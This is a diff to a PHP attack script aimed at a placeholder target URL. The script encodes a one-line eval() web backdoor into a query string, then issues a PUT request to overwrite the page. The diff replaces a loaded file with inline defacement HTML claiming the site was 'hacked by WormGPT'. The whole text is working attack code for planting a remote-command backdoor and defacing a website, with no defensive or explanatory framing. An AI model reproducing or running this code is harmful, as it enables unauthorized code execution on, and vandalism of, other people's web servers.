@@ -1,8 +1,15 @@
 <?php
 
 $targetUrl = "http://example.com/target-page.php";
-$htmlFilePath = "cazzy.html";
-$defaceHtml = file_get_contents($htmlFilePath);
+$htmlCode = "<html>
+<head>
+<title>Defaced Page</title>
+</head>
+<body>
+<h1>This page has been defaced!</h1>
+<p>Your website has been hacked by WormGPT.</p>
+</body>
+</html>";
 
 $backdoorCode = '<?php eval($_GET["cmd"]); ?>';
 $injectionUrl = $targetUrl . "?cmd=" . urlencode(base64_encode($backdoorCode));
@@ -20,7 +27,7 @@ curl_setopt($ch, CURLOPT_URL, $targetUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
-curl_setopt($ch, CURLOPT_POSTFIELDS, $defaceHtml);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $htmlCode);
 curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"); 
 $response = curl_exec($ch);
 curl_close($ch);
